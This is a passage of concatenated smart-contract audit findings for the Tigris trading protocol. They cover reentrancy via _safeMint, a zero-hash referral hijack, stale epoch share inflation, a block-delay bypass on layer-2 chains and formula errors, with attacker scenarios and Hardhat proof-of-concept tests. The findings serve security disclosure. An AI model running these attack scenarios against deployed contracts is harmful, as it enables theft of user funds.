}  } ```  ## Recommended Mitigation Steps Don't allow updating sl or tp and 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/unforgiven-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86   # Vulnerability details  ## Impact Function `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`, function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. so during normal bond creation the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. but if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` to set very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`. This would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.  ## Proof of Concept This is `distribute()` code in BondNFT contract: ``` function distribute(         address _tigAsset,         uint _amount     ) external {         if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);         unchecked {             uint aEpoch = block.timestamp / DAY;             if (aEpoch > epoch[_tigAsset]) {                 for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {                     epoch[_tigAsset] += 1;                     accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];                 }             }             accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];         }         emit Distribution(_tigAsset, _amount);     } ``` As you can see when `totalShares[_tigAsset] == 0` then the value of `epoch[_tigAsset]` won't get updated to the today. and there is no other logics in the code to update `epoch[tigAsset]`. so when `totalShares[_tigAsset] == 0` then the value of the `epoch[tigAsset]` would be out dated. this would happen when asset is recently added to the BondNFT assets or when in some time there is no bond left. When this condition happens and a user call `Lock.lock()` to create a bond the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0 so for that asset `epoch[]` won't get updated and in the `BondNFT.createLock()` the wrong value would set as bond't mint epoch. This is `Lock.lock()` code: ```     function lock(         address _asset,         uint _amount,         uint _period     ) public {         require(_period <= maxPeriod, "MAX PERIOD");         require(_period >= minPeriod, "MIN PERIOD");         require(allowedAssets[_asset], "!asset");          claimGovFees();          IERC20(_asset).transferFrom(msg.sender, address(this), _amount);         totalLocked[_asset] += _amount;                  bondNFT.createLock( _asset, _amount, _period, msg.sender);     } ``` And this is `BondNFT.createLock()` code: ```     function createLock(         address _asset,         uint _amount,         uint _period,         address _owner     ) external onlyManager() returns(uint id) {         require(allowedAsset[_asset], "!Asset");         unchecked {             uint shares = _amount * _period / 365;             uint expireEpoch = epoch[_asset] + _period;             id = ++totalBonds;             totalShares[_asset] += shares;             Bond memory _bond = Bond(                 id,             // id                 address(0),     // owner                 _asset,         // tigAsset token                 _amount,        // tigAsset amount                 epoch[_asset],  // mint epoch                 block.timestamp,// mint timestamp                 expireEpoch,    // expire epoch                 0,              // pending                 shares,         // linearly scaling share of rewards                 _period,        // lock period                 false           // is expired boolean             );             _idToBond[id] = _bond;             _mint(_owner, _bond);         }         emit Lock(_asset, _amount, _period, _owner, id);     } ```  if a bond get wrong value for mint epoch it would have wrong value for expire epoch and user would get a lot of share by lock for small time. for example this scenario: 1. let's assume `epoch[asset1]` is out dated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days) 2. during this time because `totalShare[asset1]` was 0 so `distribute()` function won't udpate `epoch[asset1]` and `epoch[asset1]` would show 30 days ago. 3. attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days. 4. some reward would get distributed into the BondNFT for the `asset1`. 5. other users would create lock too. 6. attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.  so attacker was able to create lock for long time and get shares and rewards based on that but attacker can release lock after short time.  ## Tools Used VIM  ## Recommended Mitigation Steps update `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L857-L868   # Vulnerability details  ## Impact  Trade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices   ## Proof of Concept      function _checkDelay(uint _id, bool _type) internal {         unchecked {             Delay memory _delay = blockDelayPassed[_id];             //in those situations             if (_delay.actionType == _type) {                 blockDelayPassed[_id].delay = block.number + blockDelay;             } else {                 if (block.number < _delay.delay) revert("0"); //Wait                 blockDelayPassed[_id].delay = block.number + blockDelay;                 blockDelayPassed[_id].actionType = _type;             }         }     }  _checkDelay enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. According to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. The user would open their position 1 Arbitrum block before the sync happens, the close it the very next block. It would appear that there has been 5 block (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks I would be impossible to block this behavior through parameter changes.  It also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  The delay should be measured using block.timestamp rather than block.number
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Position.sol#L126-L161   # Vulnerability details  ## Impact Function `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give attacker opportunity to reenter the Trading contract logics and perform malicious action while contract storage state is wrong. the only limitation of the attacker is that he need to bypass `_checkDelay()` checks. attacker can perform this action: 1. call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code. 2. call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.  ## Proof of Concept This is `mint()` code in Position contract: ```     function mint(         MintTrade memory _mintTrade     ) external onlyMinter {         uint newTokenID = _tokenIds.current();          Trade storage newTrade = _trades[newTokenID];         newTrade.margin = _mintTrade.margin;         newTrade.leverage = _mintTrade.leverage;         newTrade.asset = _mintTrade.asset;         newTrade.direction = _mintTrade.direction;         newTrade.price = _mintTrade.price;         newTrade.tpPrice = _mintTrade.tp;         newTrade.slPrice = _mintTrade.sl;         newTrade.orderType = _mintTrade.orderType;         newTrade.id = newTokenID;         newTrade.tigAsset = _mintTrade.tigAsset;          _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage         if (_mintTrade.orderType > 0) { // update the values of some storage functions             _limitOrders[_mintTrade.asset].push(newTokenID);             _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;         } else {             initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;             _openPositions.push(newTokenID);             _openPositionsIndexes[newTokenID] = _openPositions.length-1;              _assetOpenPositions[_mintTrade.asset].push(newTokenID);             _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;         }         _tokenIds.increment();     } ``` As you can see by calling `_safeMint()` code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. so code don't follow check-effect-interaction pattern and it's possible to perform reentrancy attack. there could be multiple scenarios that attacker can perform the attack and do some damage. two of them are:   **scenario #1 where attacker remove other users limit orders and create broken storage state** 1. attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1. 2. then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check. 3. variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list. 4. attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`. 5. `cancelLimitOrder()` checks would pass and would tries to call `Position.burn(ID1)`. 6. `burn()` function would tries to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0 so code would remove the 0 index limit order which is belongs to another user. 7. execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.  so there is two impact here, first other users limit order got removed and the second is that contract storage had bad state and burned tokens get stock in the list.   **scenario #2 where attacker steal contract/users funds by wrong profit calculation** 1. attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low. 2. code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address. 3. the value of `initId[ID1]` is not yet set for ID1. 4. attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position. 5. code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value were be based on the `newMargin`. 6. the execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value. 7. then the value of `initId[ID1]` for attacker position would be very low which would cause `accInterest` to be very higher than it supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.  so attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.  there can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.  ## Tools Used VIM  ## Recommended Mitigation Steps follow the check-effect-interaction pattern.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152   # Vulnerability details  ## Impact By default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.  ## Proof of Concept This is `createReferralCode()` code: ```     function createReferralCode(bytes32 _hash) external {         require(_referral[_hash] == address(0), "Referral code already exists");         _referral[_hash] = _msgSender();         emit ReferralCreated(_msgSender(), _hash);     } ``` As you can see attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this). Then in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral. ```     function getRef(         address _trader     ) external view returns(address) {         return referrals.getReferral(referrals.getReferred(_trader));     } ``` in the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress. `_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee form a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.  ## Tools Used VIM  ## Recommended Mitigation Steps prevent some one from setting 0x0 hash for their referral code.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734   # Vulnerability details  ## Impact  Formula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk  On initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by `_handleOpenFees ` is deducted from Initial margin posted by user.  formula misses to account the `2*referralFee` component while calculaing `_feePaid`  ## Proof of Concept Note that `_feePaid` as per formula in Line 734 is the sum of `_daoFeesPaid', and sum of `burnerFee` & `botFee`. `_daoFeesPaid` is calculated from `_fees.daoFees` which itself is calculated by subtracting `2*referralFee` and `botFee`.   So when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.   This results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.   ## Tools Used  ## Recommended Mitigation Steps  Suggest replacing the formula in line 734 with below (adding back _fees.referralFees*2)  ```             _feePaid =                 _positionSize                 * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 )                  / DIVISION_CONSTANT // divide by 100%                 + _daoFeesPaid; ``` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/IllIllI-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/IllIllI-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L97-L125   # Vulnerability details  ## Description The current implementation forces a user to extend their bonds for at least they current bond period. These mean that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.  If we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current ```BondNFT.extendLock``` function should be refactored.  ## Impact * Current ```BondNFT.extendLock``` function does not work as expected, forcing user who want to extend their bond to extend them at least for their current bond.period. * For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.  ## POC ```typescript // In 09.Bond.js,  describe "Extending lock" it("POC: Extending the lock does not work as expected", async function () {       await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther("100"));       // user lock bond funds for 10 days       await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther("100"), 10);        const fiveDaysTime = 5 * 24 * 60 * 60       const eightDaysTime = 8 * 24 * 60 * 60        // owner distribute rewards       console.log("User created a lock for 10 days")       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("10"));       await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther("10"));        // Five days pass       await network.provider.send("evm_increaseTime", [fiveDaysTime]); // Skip 10 days       await network.provider.send("evm_mine");       console.log("\n5 days pass")        // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days       const bondInfoBeforeExtension = await bond.idToBond(1)       console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)              await lock.connect(user).extendLock(1, 0, 3)       console.log("Bond was extended for 3 days")       const bondInfoAfterExtension = await bond.idToBond(1)       console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)        // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)       await network.provider.send("evm_increaseTime", [eightDaysTime]);       await network.provider.send("evm_mine");       console.log("\n8 days later")       console.log("After 13 days (10 original days + 3 days from extension) the user can not release the bond")              // The user decide to claim their part and get their bond amount       // The user should recieve all the current funds in the contract       await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')      }); ```  ## Mitigation steps In order to ```extendLock``` to work properly, the current implementation  should be changed to: ```diff function extendLock(     uint _id,     address _asset,     uint _amount,     uint _period,     address _sender ) external onlyManager() {     Bond memory bond = idToBond(_id);     Bond storage _bond = _idToBond[_id];     require(bond.owner == _sender, "!owner");     require(!bond.expired, "Expired");     require(bond.asset == _asset, "!BondAsset");     require(bond.pending == 0); //Cannot extend a lock with pending rewards +   uint currentEpoch = block.timestamp/DAY; -   require(epoch[bond.asset] == block.timestamp/DAY, "Bad epoch");     require(epoch[bond.asset] == currentEpoch, "Bad epoch");  +   uint pendingEpochs = bond.expireEpoch - currentEpoch; +   uint newBondPeriod = pendingEpochs + _period; +   //In order to respect min bond period when we extend a bon +   // Next line can be omitted at discretion of the protocol and devs +   // If it is omitted any created bond would be able to be extended always (except from those with period = 365) +   require(newBondPeriod >= 7, "MIN PERIOD");  -    require(bond.period+_period <= 365, "MAX PERIOD"); +    require(newBondPeriod <= 365, "MAX PERIOD");          unchecked { -       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365; +       uint shares = (bond.amount + _amount) * newBondPeriod / 365;  -       uint expireEpoch = block.timestamp/DAY + bond.period + _period; +       uint expireEpoch = currentEpoch + newBondPeriod;          totalShares[bond.asset] += shares-bond.shares;         _bond.shares = shares;         _bond.amount += _amount;         _bond.expireEpoch = expireEpoch;         _bond.period += _period;         _bond.mintTime = block.timestamp;  -       _bond.mintEpoch = epoch[bond.asset]; +       _bond.mintEpoch = currentEpoch; -       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18; +       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;     }     emit ExtendLock(_period, _amount, _sender,  _id); } ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285   # Vulnerability details  Both `BondNFT` and `GovNFT` are an ERC721 implementation, they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once. However the function doesn't actually safe transfer (doesn't )  ## Impact Users might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.  ## Proof of Concept I've added the following tests to the `GovNFT` tests. 1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer. 2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.  ```diff diff --git a/test/05.GovNFT.js b/test/05.GovNFT.js index 711a649..d927320 100644 --- a/test/05.GovNFT.js +++ b/test/05.GovNFT.js @@ -98,6 +98,14 @@ describe("govnft", function () {        expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);        expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);      }); + +    it("Safe transfer to non ERC721Receiver", async function () { +       +      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith("ERC721: transfer to non ERC721Receiver implementer"); +    }); +    it("Safe transfer many  to non ERC721Receiver", async function () { +      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith("ERC721: transfer to non ERC721Receiver implementer"); +    });      it("Transferring an NFT with pending delisted rewards should not affect pending rewards", async function () {        await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);        expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);  ```  Output (I've shortened the output. following test will also fail, since the successful transfer will affect them):  ```       ✔ Safe transfer to contract       1) Safe transfer many to contract     11 passing (3s)   1 failing    1) govnft        Reward system related functions          Safe transfer many to contract:        AssertionError: Expected transaction to be reverted       + expected - actual        -Transaction NOT reverted.       +Transaction reverted. ```   ## Recommended Mitigation Steps Call `_safeTransfer()` instead of `_transfer()`.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20   # Vulnerability details  ## Impact In GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn't work in GovNFT. ```solidity     uint256 public maxBridge = 20; ...     function setMaxBridge(uint256 _max) external onlyOwner {         maxBridge = _max;     } ``` ## Proof of Concept https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313 ## Tools Used None ## Recommended Mitigation Steps Consider applying the maxBridge variable
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0xSmartContract-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L295   # Vulnerability details  ## Impact The formula used for calculating ````_newPrice```` in ````addToPosition()```` function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.  The wrong formula  ``` uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin; ```  The correct formula is ``` uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price); ```  Why this workS? Given ``` P1 = _trade.price P2 = _price P = _newPrice M1 = _trade.margin M2 = _addMargin M =  M1 + M2 = _newMargin L = _trade.leverage U1 = M1 * L  = old position in USD U2 = M2 * L = new position in USD U = U1 + U2 = total position in USD E1 = U1 / P1 = old position of base asset, such as ETH, of the pair E2 = U2 / P2 = new position of base asset of the pair E = E1 + E2 = total position of base asset of the pair ```  Then ``` P = U / E   = (U1 + U2) / (E1 + E2)   = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)   = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)   = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)   = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]   = P1 * P2 * M / (M1 * P2 + M2 * P1) ``` proven.  ## Proof of Concept The following test case shows two examples that users lose some funds due to add new position whenever their existing position is in profit or loss state.  ``` const { expect } = require("chai"); const { deployments, ethers, waffle } = require("hardhat"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require("constants");  describe("Incorrect calculation of new margin price while adding position", function () {   let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get("StableToken");     stabletoken = await ethers.getContractAt("StableToken", StableToken.address);     Trading = await deployments.get("Trading");     trading = await ethers.getContractAt("Trading", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get("TradingExtension");     tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);     const Position = await deployments.get("Position");     position = await ethers.getContractAt("Position", Position.address);     MockDAI = await deployments.get("MockDAI");     mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);     MockUSDC = await deployments.get("MockUSDC");     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);     const PairsContract = await deployments.get("PairsContract");     pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);     const Referrals = await deployments.get("Referrals");     referrals = await ethers.getContractAt("Referrals", Referrals.address);     StableVault = await deployments.get("StableVault");     stablevault = await ethers.getContractAt("StableVault", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);     await network.provider.send("evm_mine");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory("BadStableVault");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get("TradingLibrary");     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe("Initial margin $500, leverage 2x, position $1000, price $1000", function () {     let orderId;     let initPrice = parseEther("1000");     beforeEach(async function () {       // To simpliy the problem, set fees to 0       await trading.setFees(true, 0, 0, 0, 0, 0);       await trading.setFees(false, 0, 0, 0, 0, 0);        let TradeInfo = [parseEther("500"), MockDAI.address, StableVault.address, parseEther("2"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);       expect(trade.price.eq(parseEther('1000'))).to.be.true;       expect(trade.leverage.eq(parseEther('2'))).to.be.true;     });      it.only("Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666", async function () {       // The price increases from $1000 to $2000, the old position earns $1000 profit.       // The expected PnL payout = old margin + earned profit + new margin       //                         = $500 + $1000 + $500       //                         = $2000       let addingPrice = parseEther('2000');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('1666'))).to.be.true;       expect(pnl._payout.lt(parseEther('1667'))).to.be.true;     });      it.only("Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714", async function () {       // The price decreases from $1000 to $750, the old position losses $250.       // The expected PnL payout = old margin - loss + new margin       //                         = $500 - $250 + $500       //                         = $750       let addingPrice = parseEther('750');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('714'))).to.be.true;       expect(pnl._payout.lt(parseEther('715'))).to.be.true;     });    }); });  ```  The test result ``` Incorrect calculation of new margin price while adding position     Initial margin $500, leverage 2x, position $1000, price $1000       √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666       √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714 ```  ## Tools Used hardhat  ## Recommended Mitigation Steps Use the correct formula, the following test case is for the same above examples after fix.  ``` const { expect } = require("chai"); const { deployments, ethers, waffle } = require("hardhat"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require("constants");  